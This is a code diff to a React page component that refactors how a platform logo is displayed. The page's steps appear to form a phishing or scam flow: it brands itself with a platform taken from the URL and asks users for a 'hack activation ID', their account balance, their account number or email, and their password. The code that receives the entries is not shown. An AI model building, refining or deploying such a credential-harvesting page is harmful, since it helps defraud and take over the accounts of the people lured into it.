@@ -27,6 +27,15 @@ const ImageWithFallback = ({ localSrc, externalSrc, alt }: { localSrc: string, e
   );
 };
 
+// --- CHANGE 1: LogoDisplay component is now defined OUTSIDE of HackIdPageComponent ---
+// It is now a standalone component that receives data via props.
+const LogoDisplay = ({ logoPath, logoUrl, platformName }: { logoPath: string, logoUrl: string, platformName: string }) => (
+    <div className="h-28 flex items-start pt-8 pl-6">
+      <ImageWithFallback localSrc={logoPath} externalSrc={logoUrl} alt={platformName} />
+    </div>
+);
+
+
 function HackIdPageComponent() {
   const searchParams = useSearchParams()
   const platformName = searchParams.get('platform') || 'Unknown Site'
@@ -173,16 +182,13 @@ function HackIdPageComponent() {
     setIsFinalPasswordInvalid(false)
   }
 
-  const LogoDisplay = () => (
-    <div className="h-28 flex items-start pt-8 pl-6">
-      <ImageWithFallback localSrc={logoPath} externalSrc={logoUrl} alt={platformName} />
-    </div>
-  )
+  // --- The LogoDisplay definition that was here has been moved outside ---
 
   if (currentPage === 1) {
     return (
       <div className="min-h-screen bg-gray-50 flex flex-col">
-        <LogoDisplay />
+        {/* --- CHANGE 2: Pass props to the LogoDisplay component --- */}
+        <LogoDisplay logoPath={logoPath} logoUrl={logoUrl} platformName={platformName} />
         <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
           <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
             Inter Your Hack Activation ID
@@ -218,7 +224,8 @@ function HackIdPageComponent() {
   if (currentPage === 2) {
     return (
       <div className="min-h-screen bg-gray-50 flex flex-col">
-        <LogoDisplay />
+        {/* --- CHANGE 2: Pass props to the LogoDisplay component --- */}
+        <LogoDisplay logoPath={logoPath} logoUrl={logoUrl} platformName={platformName} />
         <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
           <h1 className="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
             Enter Your Hack Password
@@ -257,7 +264,8 @@ function HackIdPageComponent() {
   if (currentPage === 3) {
     return (
       <div className="min-h-screen bg-gray-50 flex flex-col">
-        <LogoDisplay />
+        {/* --- CHANGE 2: Pass props to the LogoDisplay component --- */}
+        <LogoDisplay logoPath={logoPath} logoUrl={logoUrl} platformName={platformName} />
         <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
           <h1 className="text-2xl font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
             Activation Complete!
@@ -280,7 +288,8 @@ function HackIdPageComponent() {
   if (currentPage === 4) {
     return (
       <div className="min-h-screen bg-gray-50 flex flex-col">
-        <LogoDisplay />
+        {/* --- CHANGE 2: Pass props to the LogoDisplay component --- */}
+        <LogoDisplay logoPath={logoPath} logoUrl={logoUrl} platformName={platformName} />
         <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
           <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
             Enter Your Account Balance
@@ -322,7 +331,8 @@ function HackIdPageComponent() {
     }
     return (
       <div className="min-h-screen bg-gray-50 flex flex-col">
-        <LogoDisplay />
+        {/* --- CHANGE 2: Pass props to the LogoDisplay component --- */}
+        <LogoDisplay logoPath={logoPath} logoUrl={logoUrl} platformName={platformName} />
         <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
           <h1 className="text-lg font-bold text-red-600 text-center mb-3 leading-tight whitespace-nowrap">
             Enter Account Number Or Email
@@ -355,7 +365,8 @@ function HackIdPageComponent() {
   if (currentPage === 6) {
     return (
       <div className="min-h-screen bg-gray-50 flex flex-col">
-        <LogoDisplay />
+        {/* --- CHANGE 2: Pass props to the LogoDisplay component --- */}
+        <LogoDisplay logoPath={logoPath} logoUrl={logoUrl} platformName={platformName} />
         <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20">
           <h1 className="text-xl font-bold text-red-600 text-center mb-3 leading-tight max-w-64 px-4">
             Enter Your Password
@@ -391,7 +402,8 @@ function HackIdPageComponent() {
   if (currentPage === 7) {
     return (
       <div className="min-h-screen bg-gray-50 flex flex-col">
-        <LogoDisplay />
+        {/* --- CHANGE 2: Pass props to the LogoDisplay component --- */}
+        <LogoDisplay logoPath={logoPath} logoUrl={logoUrl} platformName={platformName} />
         <div className="flex-1 flex flex-col items-center justify-start px-6 pt-20 text-center">
           <div className="text-8xl mb-6 animate-pulse">⚠️</div>
           <h1 className="text-6xl font-bold text-red-600 mb-4 animate-pulse">Oops!</h1>
